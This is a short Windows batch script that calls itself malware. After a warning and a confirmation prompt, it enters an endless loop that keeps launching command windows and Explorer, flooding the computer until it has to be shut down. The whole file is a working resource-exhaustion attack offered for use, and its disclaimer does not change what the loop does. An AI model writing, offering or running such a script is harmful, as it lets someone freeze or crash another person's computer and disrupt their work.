
@echo off
title Warning! ⚠
set NoEscape= Default
set No= Default
echo Are you sure you want to execute this? I am not responsible for and damage of this malware.
set /p NoEscape=
echo Is that  %NoEscape%? If you said no close this. If yes press any key. REMEMBER. You may not ask for this.
echo Once Clicked you may need to shutdown your computer %No%
pause
:A
start
explorer
goto :A
